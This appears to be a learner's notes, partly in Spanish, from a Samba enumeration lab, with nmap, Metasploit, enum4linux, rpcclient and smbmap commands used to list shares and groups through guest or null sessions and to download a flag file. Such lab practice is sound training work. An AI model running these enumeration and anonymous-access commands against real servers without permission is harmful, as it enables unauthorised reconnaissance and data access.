#SMB Samba 3


List all available shares on the samba server using Nmap script.
    . nmap 192.32.67.3 -p- -T4 --open
    . nmap 192.32.67.3 -p 445,135 -sCV
    Con esto vemos abiertos los puertos 445 y 135. En 445 corre Samba 4.3.11 - Ubuntu
    Hay habilitada cuenta "guest". Vamos a listar ahora los contenidos compartidos con nmap
    . nmap 192.32.67.3 -p445, --script smb-enum-shares
    Ahora con metasploit
    . use auxiliary/scanner/smb/smb_enumshares
    . Después configuramos las opciones, viéndolas en el comando **info**
    Ahora con enum4linux
    . enum4linux 192.32.67.3 -S
    Ahora con smbclient
    - smbclient -L 192.32.67.3 -U "" -N
Find domain groups that exist on the samba server by using enum4Linux.
    . enum4linux 192.32.67.3 -G
    Aparecen:
        group:[Testing] rid:[0x3f0]
        group:[Maintainer] rid:[0x3ee]
        group:[Reserved] rid:[0x3ef]


Find domain groups that exist on the samba server by using rpcclient.
    . rpcclient 192.32.67.3 -U "" -N
    Ahora estamos conectados al cliente rpc, tenemos que usar sus comandos
    . rpcclient $> enumdomgroups


Is samba server configured for printing?

     ============================================ 
|    Getting printer info for 192.32.67.3    |
 ============================================ 
No printers returned.


How many directories are present inside share “public”?
    smbmap -H  192.32.67.3 -R \public

    [+] Finding open SMB ports....
[+] Guest SMB session established on 192.32.67.3...
[+] IP: 192.32.67.3:445 Name: target-1                                          
        Disk                                                    Permissions
        ----                                                    -----------
        public                                                  READ, WRITE
        .\
        dr--r--r--                0 Sat Jul  8 08:03:06 2023    .
        dr--r--r--                0 Tue Nov 27 13:36:12 2018    ..
        dr--r--r--                0 Tue Nov 27 13:36:12 2018    dev
        dr--r--r--                0 Tue Nov 27 13:36:12 2018    secret
        .\\secret\
        dr--r--r--                0 Tue Nov 27 13:36:12 2018    .
        dr--r--r--                0 Sat Jul  8 08:03:06 2023    ..
        -r--r--r--               33 Tue Nov 27 13:36:12 2018    flag


Fetch the flag from samba server.

    . smbmap -H 192.32.67.3 --download /public/secret/flag

